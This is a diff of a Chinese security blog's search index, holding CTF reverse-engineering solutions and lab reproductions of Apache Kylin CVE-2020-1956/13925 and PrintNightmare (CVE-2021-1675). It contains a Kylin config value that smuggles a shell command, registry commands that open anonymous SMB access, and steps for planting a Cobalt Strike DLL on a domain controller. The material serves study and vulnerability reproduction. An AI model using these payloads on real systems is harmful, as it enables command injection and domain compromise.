+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201023171351848.png" alt="image-20201023171351848"></p>
+<p>注意：小端模式</p>
+<h5 id="0x4-insanity"><a href="#0x4-insanity" class="headerlink" title="0x4 insanity"></a>0x4 insanity</h5><p>下载文件后直接编辑器就能查看到flag</p>
+<h5 id="0x5-getit"><a href="#0x5-getit" class="headerlink" title="0x5 getit"></a>0x5 getit</h5><p>IDA中反编译</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174234603.png" alt="image-20201022174234603"></p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022174338459.png" alt="image-20201022174338459"></p>
+<p>可以看到t就是flag，我们需要知道？的数值，编写脚本即可得到flag</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022111119084.png" alt="image-20201022111119084"></p>
+<p>此题注意：python中字符串是不可以直接操作修改的，可以先改为列表，然后重新生成</p>
+<h5 id="0x6-python-trade"><a href="#0x6-python-trade" class="headerlink" title="0x6 python-trade"></a>0x6 python-trade</h5><p>.pyc后缀的文件，直接用EasyPythonDecompiler解了，获得源码</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/24CD274DE2E7A49AC28DC75BFF631FA2.png" alt="24CD274DE2E7A49AC28DC75BFF631FA2"></p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/CF034599DBEAC7285F7E5C9C744EBB6D.png" alt="CF034599DBEAC7285F7E5C9C744EBB6D"></p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/BB56738DB65555D9FF8F1424320439CB.png" alt="BB56738DB65555D9FF8F1424320439CB"></p>
+<p>可以看到操作：对输入的字符串进行自定义的encode操作然后用base64加密</p>
+<p>编写脚本解码即得flag</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022113051197.png" alt="image-20201022113051197"></p>
+<h5 id="0x7-re1"><a href="#0x7-re1" class="headerlink" title="0x7 re1"></a>0x7 re1</h5><p>放进IDA查看</p>
+<p>查看主函数，可以看到只要输入的字符串和v5相同就可以了，找到对应v5的值即可得flag</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183057868.png" alt="image-20201022183057868"></p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175340918.png" alt="image-20201022175340918"></p>
+<h5 id="0x8-Hello-CTF"><a href="#0x8-Hello-CTF" class="headerlink" title="0x8 Hello,CTF"></a>0x8 Hello,CTF</h5><p>用IDA打开，找到主要函数</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175837176.png" alt="image-20201022175837176"></p>
+<p>从下面的循环判定值为17和上面v13的长度为34猜测出两位代表一个字符</p>
+<p>十六进制转ASCII即可得flag</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022175959301.png" alt="image-20201022175959301"></p>
+<h5 id="0x9-no-string-attached"><a href="#0x9-no-string-attached" class="headerlink" title="0x9 no-string-attached"></a>0x9 no-string-attached</h5><p>IDA中查看主函数</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180039861.png" alt="image-20201022180039861"></p>
+<p>进入每个函数看看</p>
+<p>先看banner()</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180101213.png" alt="image-20201022180101213"></p>
+<p>就是打印一些东西，查看对应打印的数值（unk_80488B0和8048960）</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180251090.png" alt="image-20201022180251090"></p>
+<p>可以看到是两个字符串，就是一些欢迎的信息之类的</p>
+<p>查看下一个，也是打印一些信息，需要你输入字符串</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180356018.png" alt="image-20201022180356018"></p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180449834.png" alt="image-20201022180449834"></p>
+<p>再看下一个，是主函数了，只要输入的函数和s2相同即可，s2是两个输入进行decrypt操作后得到的值</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180527832.png" alt="image-20201022180527832"></p>
+<p>看decrypt,对两个宽字节进行了操作。编写脚本实现功能即可得flag</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180623954.png" alt="image-20201022180623954"></p>
+<p> <img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022141847145.png" alt="image-20201022141847145"></p>
+<h5 id="0xA-csaw2013reversing2"><a href="#0xA-csaw2013reversing2" class="headerlink" title="0xA csaw2013reversing2"></a>0xA csaw2013reversing2</h5><p>IDA中看主函数</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022180506157.png" alt="image-20201022180506157"></p>
+<p>通过运行程序，发现并不会进入if的判定。</p>
+<p>lpMem+1就是我们需要知道的乱码消息</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181008895.png" alt="image-20201022181008895"></p>
+<p>可以知道通过memcpy_s操作将unk_409B10的数据给了lpMem</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181020276.png" alt="image-20201022181020276"></p>
+<p>查看sub_401000</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181112925.png" alt="image-20201022181112925"></p>
+<p>是对lpMem进行了一些操作的，猜测是由于并没有运行，所以出现乱码</p>
+<p>用IDA动态调试（debugger），下断点</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181352168.png" alt="image-20201022181352168"></p>
+<p>跳过进入判定后的ExitProcess()，直接跳到下面弹出messageboxA的地方，就能得到flag了</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181317768.png" alt="image-20201022181317768"></p>
+<h5 id="0xB-maze"><a href="#0xB-maze" class="headerlink" title="0xB maze"></a>0xB maze</h5><p>看题目就知道是一个迷宫题</p>
+<p>IDA中找主函数</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181455862.png" alt="image-20201022181455862"></p>
+<p>看到这四个不同函数的判断，猜测应该就是上下左右了</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181522773.png" alt="image-20201022181522773"></p>
+<p>分别点进去查看，得知’O’为左，’o’为右，’.’为上，’0’为下，并且在函数中有规定了8这个边界值</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181719854.png" alt="image-20201022181719854"></p>
+<p>接下来找迷宫和终点</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181743142.png" alt="image-20201022181743142"></p>
+<p>通过最终判定的条件，可以知道终点是’#’</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181833592.png" alt="image-20201022181833592"></p>
+<p>601060就是需要找的迷宫</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183115702.png" alt="image-20201022183115702"></p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022183129721.png" alt="image-20201022183129721"></p>
+<p>在HEX界面查看</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022181923615.png" alt="image-20201022181923615"></p>
+<p>根据边界值8重新排列，23就是终点，只走20即可得flag</p>
+<p><img src="/2020/10/23/0x02xctf%E6%96%B0%E6%89%8B%E8%AE%AD%E7%BB%83%E9%A2%98/image-20201022182143651.png" alt="image-20201022182143651"></p>
 ]]></content>
       <categories>
         <category>ctf</category>
@@ -860,6 +860,43 @@
       </categories>
   </entry>
   <entry>
+    <title>0x06Cve-2020-1956、Cve-2020-13925复现</title>
+    <url>/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/</url>
+    <content><![CDATA[<h4 id="Cve-2020-1956、Cve-2020-13925复现"><a href="#Cve-2020-1956、Cve-2020-13925复现" class="headerlink" title="Cve-2020-1956、Cve-2020-13925复现"></a>Cve-2020-1956、Cve-2020-13925复现</h4><p>参考：<a href="https://paper.seebug.org/1237/">https://paper.seebug.org/1237/</a></p>
+<p><a href="http://www.ijiandao.com/2b/baijia/373874.html">http://www.ijiandao.com/2b/baijia/373874.html</a></p>
+<p>这两个都是Kylin下的漏洞，放在一起复现了</p>
+<a id="more"></a>
+
+<p>环境：<strong>Kylin</strong> 官网文档 <a href="http://kylin.apache.org/cn/docs/install/kylin_docker.html">http://kylin.apache.org/cn/docs/install/kylin_docker.html</a></p>
+<h5 id="0x1-docker里下环境"><a href="#0x1-docker里下环境" class="headerlink" title="0x1 docker里下环境"></a>0x1 docker里下环境</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201109181510327.png" alt="image-20201109181510327"></p>
+<h5 id="0x2-运行docker"><a href="#0x2-运行docker" class="headerlink" title="0x2 运行docker"></a>0x2 运行docker</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-m 8G \</span><br><span class="line">-p 7070:7070 \</span><br><span class="line">-p 8088:8088 \</span><br><span class="line">-p 50070:50070 \</span><br><span class="line">-p 8032:8032 \</span><br><span class="line">-p 8042:8042 \</span><br><span class="line">-p 16010:16010 \</span><br><span class="line">apachekylin&#x2F;apache-kylin-standalone:3.0.1</span><br></pre></td></tr></table></figure>
+
+<p>注意：login的页面要等一会儿才能出来（一开始一直没有页面还以为是哪里有问题查了一会儿…..</p>
+<h5 id="0x3-使用默认密码-admin-KYLIN-登录"><a href="#0x3-使用默认密码-admin-KYLIN-登录" class="headerlink" title="0x3 使用默认密码 admin/KYLIN 登录"></a>0x3 使用默认密码 <strong>admin/KYLIN</strong> 登录</h5><p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111136838.png" alt="image-20201021111136838"></p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111207181.png" alt="image-20201021111207181"></p>
+<h5 id="0x01-Cve-2020-1956"><a href="#0x01-Cve-2020-1956" class="headerlink" title="0x01 Cve-2020-1956:"></a>0x01 Cve-2020-1956:</h5><p>0x001 修改配置：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kylin.tool.auuto-migrate-cube.enabled&#x3D;true</span><br><span class="line">kylin.tool.auto-migrate-cube.src-config&#x3D;&#x2F;home&#x2F;admin&#x2F;apache-kylin-3.0.1-bin-hbase1x&#x2F;conf&#x2F;kylin.propertie</span><br><span class="line">kylin.server.cluster-name&#x3D;kylin_metadata</span><br><span class="line">kylin.tool.auto-migrate-cube.dest-config&#x3D;&#x2F;tmp&#x2F;kylin.properties kylin_streaming_cube learn_kylin true true true true;touch &#x2F;tmp&#x2F;kami;echo</span><br></pre></td></tr></table></figure>
+
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021142624221.png" alt="image-20201021142624221"></p>
+<p>0x002 发包，可以看到返回200</p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114530646.png" alt="image-20201021114530646"></p>
+<p>0x003 进入查看（docker exec -it <CONTAINER id> bash），可以看到我们写进配置的语句被执行了，生成文件成功</CONTAINER></p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114830282.png" alt="image-20201021114830282"></p>
+<h5 id="0x02-Cve-2020-13925"><a href="#0x02-Cve-2020-13925" class="headerlink" title="0x02 Cve-2020-13925:"></a>0x02 Cve-2020-13925:</h5><p>0x001 选择一个项目，点击diagnosis，抓包</p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143637495.png" alt="image-20201021143637495"></p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143717266.png" alt="image-20201021143717266"></p>
+<p>0x002 改包，即可</p>
+<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021150700075.png" alt="image-20201021150700075"></p>
+<p>这里有一个额外的知识：burp的collaborator模块</p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>kylin</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>0x06buuctfWP-1</title>
     <url>/2021/01/18/0x06buuctfWP-1/</url>
     <content><![CDATA[<p>buuctf刷题</p>
@@ -1002,43 +1039,6 @@
       <categories>
         <category>ctf</category>
       </categories>
-  </entry>
-  <entry>
-    <title>0x06Cve-2020-1956、Cve-2020-13925复现</title>
-    <url>/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/</url>
-    <content><![CDATA[<h4 id="Cve-2020-1956、Cve-2020-13925复现"><a href="#Cve-2020-1956、Cve-2020-13925复现" class="headerlink" title="Cve-2020-1956、Cve-2020-13925复现"></a>Cve-2020-1956、Cve-2020-13925复现</h4><p>参考：<a href="https://paper.seebug.org/1237/">https://paper.seebug.org/1237/</a></p>
-<p><a href="http://www.ijiandao.com/2b/baijia/373874.html">http://www.ijiandao.com/2b/baijia/373874.html</a></p>
-<p>这两个都是Kylin下的漏洞，放在一起复现了</p>
-<a id="more"></a>
-
-<p>环境：<strong>Kylin</strong> 官网文档 <a href="http://kylin.apache.org/cn/docs/install/kylin_docker.html">http://kylin.apache.org/cn/docs/install/kylin_docker.html</a></p>
-<h5 id="0x1-docker里下环境"><a href="#0x1-docker里下环境" class="headerlink" title="0x1 docker里下环境"></a>0x1 docker里下环境</h5><p><img src="/Users/kami/Desktop/hexo/source/_posts/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201109181510327.png" alt="image-20201109181510327"></p>
-<h5 id="0x2-运行docker"><a href="#0x2-运行docker" class="headerlink" title="0x2 运行docker"></a>0x2 运行docker</h5><figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">docker run -d \</span><br><span class="line">-m 8G \</span><br><span class="line">-p 7070:7070 \</span><br><span class="line">-p 8088:8088 \</span><br><span class="line">-p 50070:50070 \</span><br><span class="line">-p 8032:8032 \</span><br><span class="line">-p 8042:8042 \</span><br><span class="line">-p 16010:16010 \</span><br><span class="line">apachekylin&#x2F;apache-kylin-standalone:3.0.1</span><br></pre></td></tr></table></figure>
-
-<p>注意：login的页面要等一会儿才能出来（一开始一直没有页面还以为是哪里有问题查了一会儿…..</p>
-<h5 id="0x3-使用默认密码-admin-KYLIN-登录"><a href="#0x3-使用默认密码-admin-KYLIN-登录" class="headerlink" title="0x3 使用默认密码 admin/KYLIN 登录"></a>0x3 使用默认密码 <strong>admin/KYLIN</strong> 登录</h5><p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111136838.png" alt="image-20201021111136838"></p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021111207181.png" alt="image-20201021111207181"></p>
-<h5 id="0x01-Cve-2020-1956"><a href="#0x01-Cve-2020-1956" class="headerlink" title="0x01 Cve-2020-1956:"></a>0x01 Cve-2020-1956:</h5><p>0x001 修改配置：</p>
-<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kylin.tool.auuto-migrate-cube.enabled&#x3D;true</span><br><span class="line">kylin.tool.auto-migrate-cube.src-config&#x3D;&#x2F;home&#x2F;admin&#x2F;apache-kylin-3.0.1-bin-hbase1x&#x2F;conf&#x2F;kylin.propertie</span><br><span class="line">kylin.server.cluster-name&#x3D;kylin_metadata</span><br><span class="line">kylin.tool.auto-migrate-cube.dest-config&#x3D;&#x2F;tmp&#x2F;kylin.properties kylin_streaming_cube learn_kylin true true true true;touch &#x2F;tmp&#x2F;kami;echo</span><br></pre></td></tr></table></figure>
-
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021142624221.png" alt="image-20201021142624221"></p>
-<p>0x002 发包，可以看到返回200</p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114530646.png" alt="image-20201021114530646"></p>
-<p>0x003 进入查看（docker exec -it <CONTAINER id> bash），可以看到我们写进配置的语句被执行了，生成文件成功</CONTAINER></p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021114830282.png" alt="image-20201021114830282"></p>
-<h5 id="0x02-Cve-2020-13925"><a href="#0x02-Cve-2020-13925" class="headerlink" title="0x02 Cve-2020-13925:"></a>0x02 Cve-2020-13925:</h5><p>0x001 选择一个项目，点击diagnosis，抓包</p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143637495.png" alt="image-20201021143637495"></p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021143717266.png" alt="image-20201021143717266"></p>
-<p>0x002 改包，即可</p>
-<p><img src="/2020/10/21/0x06Cve-2020-1956%E3%80%81Cve-2020-13925%E5%A4%8D%E7%8E%B0/image-20201021150700075.png" alt="image-20201021150700075"></p>
-<p>这里有一个额外的知识：burp的collaborator模块</p>
-]]></content>
-      <categories>
-        <category>漏洞复现</category>
-      </categories>
-      <tags>
-        <tag>kylin</tag>
-      </tags>
   </entry>
   <entry>
     <title>0x08cve-2020-15148 Yii2反序列化漏洞复现</title>
@@ -1319,8 +1319,8 @@
       </tags>
   </entry>
   <entry>
-    <title>0x0FCVE-2021-1675复现及分析</title>
-    <url>/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/</url>
+    <title>0x0FCVE-2021-1675复现</title>
+    <url>/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/</url>
     <content><![CDATA[<p>又是一个域漏洞</p>
 <p>参考：</p>
 <blockquote>
@@ -1330,37 +1330,38 @@
 <a id="more"></a>
 
 <h4 id="复现过程："><a href="#复现过程：" class="headerlink" title="复现过程："></a>复现过程：</h4><h5 id="靶机和攻击机准备："><a href="#靶机和攻击机准备：" class="headerlink" title="靶机和攻击机准备："></a>靶机和攻击机准备：</h5><h6 id="域控主机："><a href="#域控主机：" class="headerlink" title="域控主机："></a>域控主机：</h6><p>安装了2019的windows server</p>
-<p>镜像连接：<a href="https://msdn.itellyou.cn/%EF%BC%8C%E9%80%89%E7%9A%84%E6%98%AFWindows">https://msdn.itellyou.cn/，选的是Windows</a> Server 2019 Essentials (x64) - DVD (Chinese-Simplified) </p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705183115850.png" alt="image-20210705183115850"></p>
+<p>镜像连接：<a href="https://msdn.itellyou.cn/">https://msdn.itellyou.cn/</a></p>
+<p>选的是Windows Server 2019 Essentials (x64) - DVD (Chinese-Simplified) </p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705183115850.png" alt="image-20210705183115850"></p>
 <p>安装好后，点开服务器管理器，安装ad服务</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705181948192.png" alt="image-20210705181948192"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181948192.png" alt="image-20210705181948192"></p>
 <p>就一步步正常走即可，不放心的话搜索个教程就可以了</p>
 <p>安装好之后，在这里点开ad服务管理</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705182030105.png" alt="image-20210705182030105"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182030105.png" alt="image-20210705182030105"></p>
 <p>新建一个普通域用户</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705182056092.png" alt="image-20210705182056092"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182056092.png" alt="image-20210705182056092"></p>
 <p>设置用户名和密码后，可以看到如下：</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705181909731.png" alt="image-20210705181909731"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181909731.png" alt="image-20210705181909731"></p>
 <p>域控机ip：</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705181923619.png" alt="image-20210705181923619"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181923619.png" alt="image-20210705181923619"></p>
 <h6 id="共享文件机："><a href="#共享文件机：" class="headerlink" title="共享文件机："></a>共享文件机：</h6><p>一台win10的虚拟机</p>
 <p>先加入域控：更改计算机名（会要求输入一个账号密码，是域控那台虚拟机的登陆的账号密码），当然网络设置要记得改一下，dns要改成域控的ip</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705182213718.png" alt="image-20210705182213718"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182213718.png" alt="image-20210705182213718"></p>
 <p>使用github项目中的smb设置语句</p>
 <figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">mkdir C:\share</span><br><span class="line">icacls C:\share\ &#x2F;T &#x2F;grant Anonymous&#96; logon:r</span><br><span class="line">icacls C:\share\ &#x2F;T &#x2F;grant Everyone:r</span><br><span class="line">New-SmbShare -Path C:\share -Name share -ReadAccess &#39;ANONYMOUS LOGON&#39;,&#39;Everyone&#39;</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; &#x2F;v NullSessionPipes &#x2F;t REG_MULTI_SZ &#x2F;d srvsvc &#x2F;f #This will overwrite existing NullSessionPipes</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Services\LanManServer\Parameters&quot; &#x2F;v NullSessionShares &#x2F;t REG_MULTI_SZ &#x2F;d share &#x2F;f</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v EveryoneIncludesAnonymous &#x2F;t REG_DWORD &#x2F;d 1 &#x2F;f</span><br><span class="line">REG ADD &quot;HKLM\System\CurrentControlSet\Control\Lsa&quot; &#x2F;v RestrictAnonymous &#x2F;t REG_DWORD &#x2F;d 0 &#x2F;f</span><br><span class="line"># Reboot</span><br></pre></td></tr></table></figure>
 
 <p>设置共享文件夹（我这里是因为已经设置过了所以出现红色了</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705181440486.png" alt="image-20210705181440486"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181440486.png" alt="image-20210705181440486"></p>
 <p>在其中放入用攻击机生成的恶意dll，此时在域控下就可以访问到了</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705182009710.png" alt="image-20210705182009710"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182009710.png" alt="image-20210705182009710"></p>
 <h6 id="攻击机："><a href="#攻击机：" class="headerlink" title="攻击机："></a>攻击机：</h6><p>使用kali2018，cs4，生成一个恶意的dll（github的项目中是自己写的一个恶意dll，准备捡起易语言重新写写恶意dll了</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705181621562.png" alt="image-20210705181621562"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181621562.png" alt="image-20210705181621562"></p>
 <h5 id="攻击流程："><a href="#攻击流程：" class="headerlink" title="攻击流程："></a>攻击流程：</h5><p>使用exp，格式是普通域用户的用户名:密码@域控ip smb共享文件的路径</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705181533349.png" alt="image-20210705181533349"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181533349.png" alt="image-20210705181533349"></p>
 <p>攻击完成后，在cs中就可以看到上线了</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705181558463.png" alt="image-20210705181558463"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705181558463.png" alt="image-20210705181558463"></p>
 <p>ps：共享机我一开始使用的是win7，结果powershell版本不够高语句跑不了</p>
-<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0%E5%8F%8A%E5%88%86%E6%9E%90/image-20210705182346183.png" alt="image-20210705182346183"></p>
+<p><img src="/2021/07/05/0x0FCVE-2021-1675%E5%A4%8D%E7%8E%B0/image-20210705182346183.png" alt="image-20210705182346183"></p>
 ]]></content>
       <tags>
         <tag>spoolsv.exe</tag>
@@ -1682,40 +1683,6 @@
       </tags>
   </entry>
   <entry>
-    <title>seeyonOA-ajax未授权访问及任意文件上传漏洞</title>
-    <url>/2021/01/13/seeyonOA-ajax%E6%9C%AA%E6%8E%88%E6%9D%83%E8%AE%BF%E9%97%AE%E5%8F%8A%E4%BB%BB%E6%84%8F%E6%96%87%E4%BB%B6%E4%B8%8A%E4%BC%A0%E6%BC%8F%E6%B4%9E/</url>
-    <content><![CDATA[<p>参考：</p>
-<a id="more"></a>
-
